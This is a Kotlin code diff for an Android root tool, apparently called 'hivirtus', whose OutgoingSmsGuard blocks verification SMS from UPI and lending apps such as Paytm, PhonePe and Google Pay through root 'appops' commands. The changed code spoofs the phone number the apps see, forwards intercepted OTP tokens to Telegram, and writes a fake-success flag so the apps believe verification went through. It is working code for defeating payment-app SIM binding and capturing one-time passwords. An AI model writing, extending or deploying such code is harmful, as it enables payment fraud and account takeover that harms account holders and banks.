@@ -5,8 +5,7 @@ import android.util.Log
 import java.io.File
 
 /**
- * Hooked UPI verify ke dauran real SIM se SMS na jaye — Messages / MMS SEND_SMS block.
- * Native ISms hook ke saath double protection.
+ * Block real verify SMS from Messages / Phone / UPI apps — native ISms hook ke saath.
  */
 object OutgoingSmsGuard {
 
@@ -19,14 +18,27 @@ object OutgoingSmsGuard {
         "com.android.mms.service"
     )
 
+    private val upiSmsSenders = listOf(
+        "com.kreditbee.android",
+        "com.mobikwik_new",
+        "net.one97.paytm",
+        "com.phonepe.app",
+        "com.google.android.apps.nbu.paisa.user",
+        "com.stashfin.android",
+        "com.yespay.next"
+    )
+
     @Volatile
     private var blocked = false
 
     fun refresh(context: Context) {
-        val config = ConfigManager(context).load()
+        val configManager = ConfigManager(context)
+        val config = configManager.load()
+        val mockOn = config.enableVirtualSim || config.enableSim1Mock || config.enablePhoneSpoof
         val hookActive = config.hookedUpiApps.any { it.value } ||
             config.mockPhoneSim1.isNotBlank() ||
-            ConfigManager(context).readSpoofPhone().isNotBlank()
+            configManager.readSpoofPhone().isNotBlank() ||
+            mockOn
         val shouldBlock = (config.hookOutgoingSms || config.interceptFakeSuccess) && hookActive
 
         if (shouldBlock && !blocked) {
@@ -46,7 +58,7 @@ object OutgoingSmsGuard {
         val packages = messagingPackages + listOf(
             "com.android.phone",
             "com.android.providers.telephony"
-        )
+        ) + upiSmsSenders
         packages.forEach { pkg ->
             ShellHelper.runSu("appops set $pkg SEND_SMS deny 2>/dev/null")
         }
@@ -56,7 +68,7 @@ object OutgoingSmsGuard {
         val packages = messagingPackages + listOf(
             "com.android.phone",
             "com.android.providers.telephony"
-        )
+        ) + upiSmsSenders
         packages.forEach { pkg ->
             ShellHelper.runSu("appops set $pkg SEND_SMS allow 2>/dev/null")
         }
@@ -81,7 +93,7 @@ object OutgoingSmsGuard {
                 otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
                 sender = interceptDisplay,
                 body = body,
-                phone = interceptDisplay,
+                phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
                 messageLabel = app?.displayName.orEmpty(),
                 direction = "outgoing",
                 rawPeer = dest,
@@ -92,9 +104,8 @@ object OutgoingSmsGuard {
             if (SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing")) {
                 TokenForwarder(configManager, context).forward(otp)
             }
-            // Fake success — app ko lagta hai SMS send ho gaya (LSPosed intercept style)
             try {
-                java.io.File("/data/local/tmp/hivirtus_outgoing_fake_ok.flag").writeText("ok")
+                File("/data/local/tmp/hivirtus_outgoing_fake_ok.flag").writeText("ok")
             } catch (_: Exception) {}
             flag.delete()
         } catch (e: Exception) {
